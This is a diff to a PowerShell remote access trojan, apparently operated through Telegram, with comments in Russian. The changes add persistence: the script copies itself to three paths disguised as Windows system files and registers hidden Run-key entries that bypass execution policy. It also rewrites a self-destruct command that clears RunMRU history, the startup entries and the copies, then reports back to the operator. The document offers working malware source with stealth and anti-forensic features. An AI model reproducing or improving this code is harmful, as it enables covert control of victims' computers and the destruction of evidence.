@@ -111,13 +111,29 @@ function Compress-Folder {
     }
 }
 
-# Установка в автозагрузку
+# Создание нескольких копий для устойчивости
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptPath = "$env:TEMP\WindowsSystem.exe"
+$scriptPath1 = "$env:TEMP\WindowsSystem.exe"
+$scriptPath2 = "$env:APPDATA\Microsoft\Windows\System32.exe"
+$scriptPath3 = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache.exe"
+
+# Создание директорий если не существуют
+$dir2 = Split-Path $scriptPath2 -Parent
+$dir3 = Split-Path $scriptPath3 -Parent
+if (!(Test-Path $dir2)) { New-Item -ItemType Directory -Path $dir2 -Force | Out-Null }
+if (!(Test-Path $dir3)) { New-Item -ItemType Directory -Path $dir3 -Force | Out-Null }
+
+# Копирование скрипта в несколько мест
+$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
+$scriptContent | Out-File -FilePath $scriptPath1 -Encoding UTF8
+$scriptContent | Out-File -FilePath $scriptPath2 -Encoding UTF8
+$scriptContent | Out-File -FilePath $scriptPath3 -Encoding UTF8
+
+# Установка в автозагрузку через несколько записей
 if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
-$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
-Set-ItemProperty -Path $regPath -Name "WindowsSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
+Set-ItemProperty -Path $regPath -Name "WindowsSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath1`"" -Force
+Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath2`"" -Force
+Set-ItemProperty -Path $regPath -Name "SystemCache" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath3`"" -Force
 
 # Основные переменные
 $currentDir = "C:\"
@@ -214,26 +230,39 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
-                            # Отправляем сообщение перед уничтожением
-                            Send-Telegram "RAT самоуничтожается. Все следы удаляются."
-                            
                             # Очистка истории RUN
                             Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                             
                             # Удаление из автозагрузки
                             Remove-ItemProperty -Path $regPath -Name "WindowsSystem" -Force -ErrorAction SilentlyContinue
+                            Remove-ItemProperty -Path $regPath -Name "WindowsUpdate" -Force -ErrorAction SilentlyContinue
+                            Remove-ItemProperty -Path $regPath -Name "SystemCache" -Force -ErrorAction SilentlyContinue
                             
-                            # Создаем скрипт для удаления файлов после завершения работы
-                            $cleanupScript = @"
-Start-Sleep -Seconds 3
-Remove-Item "$scriptPath" -Force -ErrorAction SilentlyContinue
-Remove-Item "$($MyInvocation.MyCommand.Path)" -Force -ErrorAction SilentlyContinue
-"@
-                            $cleanupPath = "$env:TEMP\cleanup.ps1"
-                            $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
+                            # Удаление файлов
+                            $filesToDelete = @(
+                                $scriptPath1,
+                                $scriptPath2, 
+                                $scriptPath3,
+                                $MyInvocation.MyCommand.Path
+                            )
                             
-                            # Запускаем скрипт очистки и завершаем работу
-                            Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -Wait:$false
+                            foreach ($file in $filesToDelete) {
+                                if (Test-Path $file) { 
+                                    try {
+                                        Remove-Item $file -Force -ErrorAction SilentlyContinue
+                                    } catch { }
+                                }
+                            }
+                            
+                            # Дополнительная очистка следов
+                            $tempFiles = Get-ChildItem -Path $env:TEMP -Filter "*WindowsSystem*" -ErrorAction SilentlyContinue
+                            foreach ($tempFile in $tempFiles) {
+                                try {
+                                    Remove-Item $tempFile.FullName -Force -ErrorAction SilentlyContinue
+                                } catch { }
+                            }
+                            
+                            Send-Telegram "RAT самоуничтожен. Все следы удалены."
                             exit
                         }
                     }
